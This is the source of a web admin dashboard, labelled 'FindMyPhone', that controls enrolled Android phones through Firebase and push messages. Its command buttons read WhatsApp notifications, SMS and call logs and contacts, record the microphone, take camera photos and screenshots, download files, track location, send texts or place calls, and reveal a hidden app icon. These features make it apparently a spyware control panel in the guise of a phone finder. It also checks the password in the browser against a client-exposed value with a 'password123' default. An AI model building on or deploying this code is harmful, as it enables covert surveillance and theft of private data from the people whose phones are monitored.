---
import Layout from '../layouts/Layout.astro';
---

<Layout title="Admin Dashboard" noindex={true}>
  <div class="admin-wrapper" style="max-width: 1200px; margin: 0 auto; padding: 40px 24px; min-height: 70vh; display: flex; flex-direction: column; justify-content: center;">
    
    <!-- Login Form -->
    <div id="login-container" class="login-card" style="background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 24px; padding: 48px 32px; max-width: 400px; width: 100%; margin: 0 auto; box-shadow: 0 20px 40px rgba(0,0,0,0.4);">
      <h1 style="font-family: var(--font-display); font-size: 2rem; margin-bottom: 24px; text-align: center;">Admin Access</h1>
      
      <div style="display: flex; flex-direction: column; gap: 16px;">
        <div>
          <label for="username" style="display: block; margin-bottom: 8px; font-size: 0.875rem; color: var(--cyber-text-dim); font-family: var(--font-mono); letter-spacing: 0.05em;">SYSTEM IDENTIFICATION</label>
          <input type="text" id="username" class="input-field" autocomplete="username" style="width: 100%; padding: 12px 16px; border-radius: 12px; background: var(--color-surface-2); border: 1px solid var(--color-border); color: var(--color-ink); outline: none; transition: border-color 0.2s;" />
        </div>
        
        <div>
          <label for="password" style="display: block; margin-bottom: 8px; font-size: 0.875rem; color: var(--cyber-text-dim); font-family: var(--font-mono); letter-spacing: 0.05em;">AUTHORIZATION KEY</label>
          <input type="password" id="password" class="input-field" autocomplete="current-password" style="width: 100%; padding: 12px 16px; outline: none;" />
        </div>
        
        <p id="error-msg" style="color: #ff4d4d; font-size: 0.875rem; display: none; text-align: center; margin: 0;">Invalid credentials</p>
        
        <button id="login-btn" class="btn-primary" style="width: 100%; margin-top: 8px; padding: 14px; font-weight: 700; border: none; cursor: pointer; transition: opacity 0.2s;">
          Login
        </button>
      </div>
    </div>

    <!-- Secure Content: FindMyPhone Dashboard -->
    <div id="admin-content" style="display: none; width: 100%;">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-wrap: wrap; gap: 16px;">
        <h1 class="dashboard-title" style="font-size: 2.5rem; margin: 0; font-weight: 800;">SYSGUARD_COMMAND_CENTER</h1>
        <button id="logout-btn" class="btn-secondary" style="padding: 10px 20px; font-size: 0.875rem; cursor: pointer; text-transform: uppercase; letter-spacing: 0.1em;">Terminate Session</button>
      </div>
      
      <div class="dashboard-container" style="display: grid; grid-template-columns: 300px 1fr; gap: 24px; align-items: start;">
        
        <!-- Devices List -->
        <div class="panel" style="padding: 24px;">
          <h3 style="font-size: 1.25rem; margin-bottom: 24px;">Connected Nodes</h3>
          <ul id="device-list" style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 8px;">
            <li style="padding: 12px; color: var(--cyber-text-dim); font-family: var(--font-mono);">Scanning network...</li>
          </ul>
        </div>
        
        <!-- Controls -->
        <div class="panel" id="controls" style="display: none; background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 16px; padding: 24px;">
          <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 24px;">
            <h2 id="device-name" style="font-family: var(--font-display); font-size: 1.5rem; margin: 0; color: var(--color-lime);">Select a device</h2>
            <button id="edit-name-btn" title="Edit device name" style="display: none; background: transparent; border: none; font-size: 1.2rem; cursor: pointer; padding: 4px; border-radius: 4px; transition: background 0.2s;">✏️</button>
          </div>
          
          <div class="command-groups" style="display: flex; flex-direction: column; gap: 24px; margin-bottom: 24px;">
            
            <div class="cmd-group">
              <h4 style="font-family: var(--font-mono); color: var(--cyber-cyan); margin-bottom: 12px; font-size: 0.9rem; letter-spacing: 0.05em; border-bottom: 1px solid var(--cyber-cyan-dim); padding-bottom: 4px;">IDENTITY & EVIDENCE</h4>
              <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                <button class="cmd-btn btn-primary" data-action="sms_remote">Remote SMS</button>
                <button class="cmd-btn btn-primary" data-action="call_remote">Remote Call</button>
              </div>
            </div>

            <div class="cmd-group">
              <h4 style="font-family: var(--font-mono); color: var(--cyber-purple); margin-bottom: 12px; font-size: 0.9rem; letter-spacing: 0.05em; border-bottom: 1px solid var(--cyber-cyan-dim); padding-bottom: 4px;">STEALTH & SECURITY</h4>
              <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                <button class="cmd-btn btn-primary" data-action="p">Check Online</button>
                <button class="cmd-btn btn-primary" data-action="show_app">Reveal Icon</button>
                <button class="cmd-btn btn-primary" style="border-color: #ff4757; color: #ff4757;" data-action="allow_uninstall">Master Unlock</button>
              </div>
            </div>

            <div class="cmd-group">
              <h4 style="font-family: var(--font-mono); color: var(--cyber-cyan); margin-bottom: 12px; font-size: 0.9rem; letter-spacing: 0.05em; border-bottom: 1px solid var(--cyber-cyan-dim); padding-bottom: 4px;">MONITORING & INTELLIGENCE</h4>
              <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                <button class="cmd-btn btn-primary" data-action="status">Device Status</button>
                <button class="cmd-btn btn-primary" data-action="whatsapp">WhatsApp Only</button>
                <button class="cmd-btn btn-primary" data-action="notifs">All Notifs</button>
                <button class="cmd-btn btn-primary" data-action="apps">List Apps</button>
                <button class="cmd-btn btn-primary" data-action="contacts_file">Contacts File</button>
              </div>
            </div>

            <div class="cmd-group">
              <h4 style="font-family: var(--font-mono); color: var(--cyber-purple); margin-bottom: 12px; font-size: 0.9rem; letter-spacing: 0.05em; border-bottom: 1px solid var(--cyber-cyan-dim); padding-bottom: 4px;">MEDIA & ENVIRONMENT</h4>
              <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                <button class="cmd-btn btn-primary" data-action="record">Record Mic</button>
                <button class="cmd-btn btn-primary" data-action="tts">Speak Text</button>
                <button class="cmd-btn btn-primary" data-action="screenshot">Capture Screen</button>
                <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "front"}'>Front Lens</button>
                <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "back"}'>Main Lens</button>
              </div>
            </div>

            <div class="cmd-group">
              <h4 style="font-family: var(--font-mono); color: var(--cyber-text-dim); margin-bottom: 12px; font-size: 0.9rem; letter-spacing: 0.05em; border-bottom: 1px solid var(--cyber-cyan-dim); padding-bottom: 4px;">FILE SYSTEM & LEGACY</h4>
              <div style="display: flex; flex-wrap: wrap; gap: 12px;">
                <button class="cmd-btn btn-primary" data-action="ring">Start Ring</button>
                <button class="cmd-btn btn-primary" data-action="stop">Stop Ring</button>
                <button class="cmd-btn btn-primary" data-action="locate">Trace Location</button>
                <button class="cmd-btn btn-primary" data-action="ls" data-extra='{"path": "/storage/emulated/0"}'>File System</button>
                <button class="cmd-btn btn-primary" data-action="sms">SMS Logs</button>
                <button class="cmd-btn btn-primary" data-action="calls">Call Logs</button>
              </div>
            </div>
          </div>
          
          <div id="response-area" style="padding: 24px; min-height: 200px; max-height: 500px; overflow-y: auto;">
            <p style="margin: 0; font-family: var(--font-mono); color: var(--cyber-text-dim);">SYSTEM STANDBY. SELECT A COMMAND TO INITIATE UPLINK.</p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <style is:global>
    /* Cinematic Cyberpunk Theme */
    :root {
      --cyber-bg: #030712;
      --cyber-surface: rgba(15, 23, 42, 0.6);
      --cyber-surface-2: rgba(30, 41, 59, 0.7);
      --cyber-border: rgba(56, 189, 248, 0.2);
      --cyber-cyan: #00f0ff;
      --cyber-cyan-dim: rgba(0, 240, 255, 0.5);
      --cyber-purple: #b026ff;
      --cyber-text: #e0f2fe;
      --cyber-text-dim: #94a3b8;
      --font-display: 'Space Grotesk', system-ui, sans-serif;
      --font-mono: 'IBM Plex Mono', 'JetBrains Mono', monospace;
    }
    
    body {
      background-color: var(--cyber-bg);
      background-image: 
        radial-gradient(circle at 50% 0%, rgba(0, 240, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 100% 100%, rgba(176, 38, 255, 0.05) 0%, transparent 50%);
      background-attachment: fixed;
    }
    
    .admin-wrapper h1, .admin-wrapper h2, .admin-wrapper h3 {
      font-family: var(--font-display) !important;
      letter-spacing: 0.05em;
      color: var(--cyber-cyan) !important;
      text-shadow: 0 0 20px rgba(0, 240, 255, 0.4);
    }
    
    .login-card, .panel {
      background: var(--cyber-surface) !important;
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid var(--cyber-border) !important;
      box-shadow: 0 10px 40px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.05) !important;
      border-radius: 16px !important;
      position: relative;
      overflow: hidden;
    }
    
    .login-card::after, .panel::after {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; height: 1px;
      background: linear-gradient(90deg, transparent, var(--cyber-cyan-dim), transparent);
    }
    
    .input-field {
      background: rgba(0,0,0,0.3) !important;
      border: 1px solid rgba(56, 189, 248, 0.3) !important;
      color: var(--cyber-text) !important;
      border-radius: 8px !important;
      font-family: var(--font-mono);
      transition: all 0.3s ease !important;
    }
    .input-field:focus {
      border-color: var(--cyber-cyan) !important;
      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2) !important;
    }
    
    .btn-primary {
      background: rgba(0, 240, 255, 0.1) !important;
      color: var(--cyber-cyan) !important;
      border: 1px solid var(--cyber-cyan-dim) !important;
      border-radius: 8px !important;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      font-family: var(--font-display);
      font-weight: 600;
      padding: 10px 16px;
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1) !important;
      position: relative;
    }
    .btn-primary::before {
      content: '';
      position: absolute;
      top: 0; left: -100%; width: 50%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: all 0.4s ease;
    }
    .btn-primary:hover {
      background: var(--cyber-cyan) !important;
      color: #000 !important;
      box-shadow: 0 0 20px rgba(0, 240, 255, 0.5) !important;
      transform: translateY(-2px) !important;
    }
    .btn-primary:hover::before {
      left: 200%;
    }
    
    .btn-secondary {
      background: rgba(255, 255, 255, 0.05) !important;
      color: var(--cyber-text) !important;
      border: 1px solid rgba(255, 255, 255, 0.1) !important;
      border-radius: 8px !important;
      font-family: var(--font-mono);
    }
    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.1) !important;
      border-color: var(--cyber-text) !important;
    }

    #device-list li {
      padding: 14px 16px;
      margin-bottom: 8px;
      background: rgba(0, 0, 0, 0.2) !important;
      border: 1px solid rgba(255, 255, 255, 0.05);
      border-radius: 12px;
      cursor: pointer;
      color: var(--cyber-text-dim);
      font-family: var(--font-display);
      font-weight: 500;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    #device-list li::before {
      content: '';
      display: block;
      width: 8px; height: 8px;
      border-radius: 50%;
      background: var(--cyber-text-dim);
      transition: all 0.3s ease;
    }
    #device-list li:hover {
      background: rgba(0, 240, 255, 0.05) !important;
      border-color: var(--cyber-cyan-dim);
      color: var(--cyber-text);
      transform: translateX(4px);
    }
    #device-list li.active {
      background: rgba(0, 240, 255, 0.1) !important;
      border-color: var(--cyber-cyan);
      color: var(--cyber-cyan);
      box-shadow: 0 0 15px rgba(0, 240, 255, 0.1);
    }
    #device-list li.active::before {
      background: var(--cyber-cyan);
      box-shadow: 0 0 10px var(--cyber-cyan);
    }
    
    #response-area {
      background: rgba(0, 0, 0, 0.4) !important;
      border: 1px solid var(--cyber-border) !important;
      border-radius: 12px !important;
      color: var(--cyber-text) !important;
      font-family: var(--font-mono) !important;
      box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
    }
    #response-area p, #response-area h4 {
      color: var(--cyber-text) !important;
    }
    
    .dashboard-title {
      background: linear-gradient(to right, var(--cyber-cyan), var(--cyber-purple));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: none;
    }

    .file-item {
      padding: 10px 14px;
      cursor: pointer;
      margin-bottom: 4px;
      border: 1px solid transparent;
      border-radius: 8px;
      transition: all 0.2s ease;
      font-family: var(--font-mono);
      font-size: 0.9rem;
    }
    .file-item:hover {
      background: rgba(0, 240, 255, 0.08) !important;
      border-color: var(--cyber-cyan-dim);
    }
    
    /* Scrollbar */
    #response-area::-webkit-scrollbar { width: 8px; }
    #response-area::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); border-left: 1px solid var(--cyber-border); }
    #response-area::-webkit-scrollbar-thumb { background: var(--cyber-cyan-dim); border-radius: 4px; }
    #response-area::-webkit-scrollbar-thumb:hover { background: var(--cyber-cyan); }

    @media (max-width: 768px) {
      .dashboard-container {
        grid-template-columns: 1fr !important;
      }
    }
  </style>
</Layout>

<script>
  import { db } from '../secrets/firebase.js';
  import { ref, onValue, set, update } from 'firebase/database';

  // --- Auth Logic ---
  const EXPECTED_USER = import.meta.env.PUBLIC_ADMIN_USER || 'admin';
  const EXPECTED_PASS = import.meta.env.PUBLIC_ADMIN_PASS || 'password123';

  const loginContainer = document.getElementById('login-container');
  const adminContent = document.getElementById('admin-content');
  const loginBtn = document.getElementById('login-btn');
  const logoutBtn = document.getElementById('logout-btn');
  const errorMsg = document.getElementById('error-msg');
  const usernameInput = document.getElementById('username') as HTMLInputElement;
  const passwordInput = document.getElementById('password') as HTMLInputElement;

  // Check auth state on load
  if (sessionStorage.getItem('auth_token') === 'verified') {
    showAdminContent();
  }

  loginBtn?.addEventListener('click', async () => {
    const u = usernameInput?.value;
    const p = passwordInput?.value;
    
    if (!u || !p) {
      showError('Please enter both username and password.');
      return;
    }
    
    loginBtn.textContent = 'Verifying...';
    loginBtn.style.opacity = '0.7';

    try {
      if (u === EXPECTED_USER && p === EXPECTED_PASS) {
        sessionStorage.setItem('auth_token', 'verified');
        showAdminContent();
        if (errorMsg) errorMsg.style.display = 'none';
        usernameInput.value = '';
        passwordInput.value = '';
      } else {
        showError('Invalid credentials');
      }
    } catch (err) {
      showError('Authentication error');
    } finally {
      loginBtn.textContent = 'Login';
      loginBtn.style.opacity = '1';
    }
  });

  passwordInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') loginBtn?.click();
  });
  usernameInput?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') passwordInput?.focus();
  });

  logoutBtn?.addEventListener('click', () => {
    sessionStorage.removeItem('auth_token');
    if (adminContent) adminContent.style.display = 'none';
    if (loginContainer) loginContainer.style.display = 'block';
  });

  function showAdminContent() {
    if (loginContainer) loginContainer.style.display = 'none';
    if (adminContent) adminContent.style.display = 'block';
    // Initialize Dashboard once authenticated
    if (!window.dashboardInitialized) {
      initDashboard();
      window.dashboardInitialized = true;
    }
  }

  function showError(msg: string) {
    if (errorMsg) {
      errorMsg.textContent = msg;
      errorMsg.style.display = 'block';
    }
  }

  // --- FindMyPhone Dashboard Logic ---
  
  // Extend Window for TypeScript
  declare global {
    interface Window {
      dashboardInitialized: boolean;
      sendCommand: (action: string, extraData?: any) => void;
    }
  }

  let currentDeviceId: string | null = null;
  let currentDeviceToken: string | null = null;
  let listenersAttached = false; // Prevent multiple listeners on re-auth

  function initDashboard() {
    if (listenersAttached) return;
    listenersAttached = true;

    const devicesRef = ref(db, 'findmyphone/devices');
    onValue(devicesRef, (snapshot) => {
      const data = snapshot.val();
      const list = document.getElementById('device-list');
      if (!list) return;
      
      list.innerHTML = '';
      if (!data) {
        list.innerHTML = '<li style="padding: 12px; border-radius: 8px; background: rgba(255,255,255,0.05); color: var(--cyber-text-dim);">No active nodes found</li>';
        return;
      }
      
      Object.keys(data).forEach(deviceId => {
        const deviceInfo = data[deviceId] || {};
        const li = document.createElement('li');
        const deviceName = deviceInfo.custom_name || deviceInfo.name || 'Unknown Device';
        li.textContent = deviceName;
        li.onclick = () => selectDevice(deviceId, deviceName, deviceInfo.fcm_token, li);
        if (deviceId === currentDeviceId) li.classList.add('active');
        list.appendChild(li);
      });
    });

    // Edit Name Button logic
    const editBtn = document.getElementById('edit-name-btn');
    if (editBtn && !editBtn.hasAttribute('data-initialized')) {
      editBtn.setAttribute('data-initialized', 'true');
      editBtn.addEventListener('click', () => {
        if (!currentDeviceId) return;
        const currentName = document.getElementById('device-name')?.textContent || '';
        const newName = prompt('Enter a new custom name for this device:', currentName);
        if (newName && newName.trim() !== '' && newName !== currentName) {
           const deviceRef = ref(db, `findmyphone/devices/${currentDeviceId}`);
           update(deviceRef, { custom_name: newName.trim() })
             .catch(err => alert('Failed to rename: ' + err));
        }
      });
    }

    // Attach event listeners to command buttons
    document.querySelectorAll('.cmd-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        const target = e.currentTarget as HTMLButtonElement;
        const action = target.getAttribute('data-action');
        const extraStr = target.getAttribute('data-extra');
        let extra = {};
        if (extraStr) {
          try { extra = JSON.parse(extraStr); } catch (e) {}
        }
        
        if (action === 'sms_remote') {
          const num = prompt('Enter target phone number:');
          if (!num) return;
          const msg = prompt('Enter message to send:');
          if (!msg) return;
          extra = { number: num, msg: msg };
        } else if (action === 'call_remote') {
          const num = prompt('Enter target phone number:');
          if (!num) return;
          extra = { number: num };
        } else if (action === 'record') {
          const dur = prompt('Enter duration in seconds (e.g. 10):', '10');
          if (!dur) return;
          extra = { duration: parseInt(dur) || 10 };
        } else if (action === 'tts') {
          const text = prompt('Enter text to speak on device:');
          if (!text) return;
          extra = { text: text };
        }
        
        if (action) window.sendCommand(action, extra);
      });
    });
  }

  function selectDevice(id: string, name: string, token: string, element: HTMLElement) {
    currentDeviceId = id;
    currentDeviceToken = token;
    const controls = document.getElementById('controls');
    const deviceName = document.getElementById('device-name');
    const editBtn = document.getElementById('edit-name-btn');
    
    if (controls) controls.style.display = 'block';
    if (deviceName) deviceName.textContent = name;
    if (editBtn) editBtn.style.display = 'block';
    
    // Update active styling
    document.querySelectorAll('#device-list li').forEach(el => el.classList.remove('active'));
    element.classList.add('active');

    // Listen for responses
    listenToDevice(id);
  }

  function listenToDevice(deviceId: string) {
    const respRef = ref(db, `findmyphone/devices/${deviceId}/fs_response`);
    const locRef = ref(db, `findmyphone/devices/${deviceId}/location`);
    const area = document.getElementById('response-area');
    if (!area) return;

    onValue(respRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;
      if (data._cleared) return; // Prevent UI clear after auto-cleanup
      
      area.innerHTML = '';
      if (data.screenshot_base64) {
        area.innerHTML = `<img src="data:image/jpeg;base64,${data.screenshot_base64}" alt="Screenshot" />`;
      } else if (data.photo_base64) {
        area.innerHTML = `<img src="data:image/jpeg;base64,${data.photo_base64}" alt="Photo" />`;
      } else if (data.files) {
        let html = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">Directory Listing: ${data.path}</h4><ul style="list-style: none; padding: 0; margin: 0;">`;
        if (data.path && data.path !== '/' && data.path !== '/storage/emulated/0') {
           const parentPath = data.path.split('/').slice(0, -1).join('/') || '/';
           html += `<li class="file-item" data-action="ls" data-path="${parentPath.replace(/"/g, '&quot;')}"><span style="color: var(--cyber-cyan)">[ LEVEL UP ]</span></li>`;
        }
        data.files.forEach((f: any) => {
          const basePath = (data.path || '').replace(/\/$/, '');
          const itemPath = basePath + '/' + f.name;
          if (f.isDirectory) {
             html += `<li class="file-item" data-action="ls" data-path="${itemPath.replace(/"/g, '&quot;')}"><span style="color: var(--cyber-purple)">DIR</span> &nbsp; ${f.name}</li>`;
          } else {
             html += `<li class="file-item" data-action="download" data-path="${itemPath.replace(/"/g, '&quot;')}"><span style="color: var(--cyber-text-dim)">FILE</span> ${f.name} <span style="font-size: 0.85rem; color: var(--cyber-cyan-dim); float: right;">(${Math.round(f.size/1024)} KB)</span></li>`;
          }
        });
        html += '</ul>';
        area.innerHTML = html;
        
        // Attach dynamic event listeners for files
        area.querySelectorAll('.file-item').forEach(el => {
          el.addEventListener('click', (e) => {
            const target = e.currentTarget as HTMLElement;
            const act = target.getAttribute('data-action');
            const path = target.getAttribute('data-path');
            if (act && path) window.sendCommand(act, { path });
          });
        });
        
      } else if (data.file_base64) {
         area.innerHTML = `<a href="data:application/octet-stream;base64,${data.file_base64}" download="${data.filename}" style="color:var(--cyber-cyan); padding: 12px 20px; border: 1px solid var(--cyber-cyan-dim); border-radius: 8px; display: inline-block; text-decoration: none; font-weight: bold; background: rgba(0, 240, 255, 0.1);">[ SECURE DOWNLOAD: ${data.filename} ]</a>`;
      } else if (data.download_url) {
         area.innerHTML = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">TRANSFER READY</h4>
         <a href="${data.download_url}" target="_blank" download="${data.filename || 'file'}" style="color:var(--cyber-cyan); padding: 12px 20px; border: 1px solid var(--cyber-cyan-dim); border-radius: 8px; display: inline-block; text-decoration: none; font-weight: bold; background: rgba(0, 240, 255, 0.1);">[ FETCH ${data.filename || 'PAYLOAD'} ]</a>`;
      } else if (data.logs_url) {
         area.innerHTML = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">${data.type || 'DATA'} EXTRACTED</h4>
         <a href="${data.logs_url}" target="_blank" download="${data.type || 'logs'}.txt" style="color:var(--cyber-cyan); padding: 12px 20px; border: 1px solid var(--cyber-cyan-dim); border-radius: 8px; display: inline-block; text-decoration: none; font-weight: bold; background: rgba(0, 240, 255, 0.1);">[ FETCH ${data.type || 'LOGS'} ]</a>`;
      } else if (data.log_content) {
         const blob = new Blob([data.log_content], { type: 'text/plain' });
         const url = URL.createObjectURL(blob);
         const filename = `${data.type || 'log'}_${Date.now()}.txt`;
         area.innerHTML = `<h4 style="margin-bottom: 12px; font-family: var(--font-mono); color: var(--cyber-cyan);">${data.type || 'DATA'} DUMPED</h4>
         <a href="${url}" download="${filename}" style="color:var(--cyber-cyan); padding: 12px 20px; border: 1px solid var(--cyber-cyan-dim); border-radius: 8px; display: inline-block; text-decoration: none; font-weight: bold; background: rgba(0, 240, 255, 0.1);">[ DOWNLOAD ${filename} ]</a>`;
      } else if (data.error) {
         const errText = typeof data.error === 'object' ? JSON.stringify(data.error) : data.error;
         area.innerHTML = `<p style="color: #ff4757; padding: 16px; border-left: 4px solid #ff4757; background: rgba(255, 71, 87, 0.1); border-radius: 0 8px 8px 0; font-family: var(--font-mono);">[!] EXCEPTION: ${errText}</p>`;
      } else if (data.status) {
         const statText = typeof data.status === 'object' ? JSON.stringify(data.status) : data.status;
         area.innerHTML = `<p style="color: var(--cyber-text); padding: 16px; border-left: 4px solid var(--cyber-cyan); background: rgba(0, 240, 255, 0.05); border-radius: 0 8px 8px 0; font-family: var(--font-mono);">SYSTEM // ${statText}</p>`;
      }
      
      // Auto-cleanup massive payloads from DB to save bandwidth
      if (data.screenshot_base64 || data.photo_base64 || data.file_base64 || data.log_content) {
         update(respRef, { 
           screenshot_base64: null,
           photo_base64: null, 
           file_base64: null, 
           log_content: null,
           _cleared: true
         }).catch(err => console.error("Auto-cleanup failed:", err));
      }
    });

    onValue(locRef, (snapshot) => {
       const data = snapshot.val();
       if (data && data.lat) {
          // Remove old location divs to prevent stacking
          document.querySelectorAll('.location-response').forEach(el => el.remove());
          
          const locDiv = document.createElement('div');
          locDiv.className = 'location-response';
          locDiv.style.marginBottom = '16px';
          locDiv.innerHTML = `<p style="border-left: 4px solid var(--cyber-cyan); padding: 16px; background: rgba(0, 240, 255, 0.05); font-family: var(--font-mono); border-radius: 0 8px 8px 0;">SATELLITE LOCK ACQUIRED: <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:var(--cyber-cyan); text-decoration: none; font-weight: bold; border-bottom: 1px solid var(--cyber-cyan);">Open Link</a> <span style="font-size: 0.85rem; color: var(--cyber-text-dim); margin-left: 10px;">[${new Date().toLocaleTimeString()}]</span></p>`;
          
          const statusBox = document.getElementById('cmd-status');
          if (statusBox && statusBox.textContent?.includes('locate')) {
              statusBox.remove();
          }
          
          const area = document.getElementById('response-area');
          if (area) area.prepend(locDiv);
       }
    });
  }

  window.sendCommand = async (action: string, extraData: any = {}) => {
    if (!currentDeviceId || !currentDeviceToken) {
       alert("No device selected or device missing FCM token");
       return;
    }
    
    // We still write to RTDB as a fallback/record, but the real wake-up comes from FCM
    const cmdRef = ref(db, `findmyphone/devices/${currentDeviceId}/command`);
    
    // Clear previous response so identical consecutive errors trigger onValue
    const respRef = ref(db, `findmyphone/devices/${currentDeviceId}/fs_response`);
    set(respRef, null);
    
    const area = document.getElementById('response-area');
    if (area) {
       area.innerHTML = `<div id="cmd-status" style="display: flex; align-items: center; gap: 16px; padding: 16px; background: rgba(0, 240, 255, 0.05); border-left: 4px solid var(--cyber-cyan); border-radius: 0 8px 8px 0; margin-bottom: 16px;">
          <div class="spinner" style="width: 20px; height: 20px; border: 2px solid var(--cyber-border); border-top-color: var(--cyber-cyan); border-radius: 50%; animation: spin 1s linear infinite;"></div>
          <p id="cmd-text" style="margin: 0; font-family: var(--font-mono); color: var(--cyber-text); letter-spacing: 0.05em;">INITIATING ${action.toUpperCase()} PROTOCOL...</p>
       </div>`;
    }
    
    // Trigger the backend API to send the FCM Push Notification
    try {
      const response = await fetch('/api/send-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
           action: action,
           token: currentDeviceToken,
           extraData: extraData
        })
      });
      
      const result = await response.json();
      if (!response.ok) throw new Error(result.error || 'API Error');
      
      const cmdText = document.getElementById('cmd-text');
      if (cmdText) cmdText.textContent = `PAYLOAD DELIVERED. AWAITING TELEMETRY...`;
      
      const fireAndForget = ['ring', 'stop', 'locate', 'show_app', 'update'];
      if (fireAndForget.includes(action)) {
          setTimeout(() => {
             const statusBox = document.getElementById('cmd-status');
             if (statusBox) {
                if (action === 'locate') {
                    statusBox.innerHTML = `<p style="margin: 0; font-family: var(--font-mono); color: var(--cyber-cyan);">CONNECTING TO GPS CONSTELLATION...</p>`;
                } else {
                    statusBox.innerHTML = `<p style="margin: 0; font-family: var(--font-mono); color: var(--cyber-cyan);">PROTOCOL SUCCESSFULLY EXECUTED.</p>`;
                }
             }
          }, 2500);
      }
      
      // Also set the command in RTDB so LanServerService handles it once awake
      set(cmdRef, {
        action: action,
        timestamp: Date.now(),
        ...extraData
      });
      
    } catch (err: any) {
      if (area) area.innerHTML = `<p style="color: #ff4d4d; font-weight: 500; background: rgba(255, 77, 77, 0.1); padding: 12px; border-radius: 8px;">Failed to send FCM: ${err.message}</p>`;
    }
  };
</script>
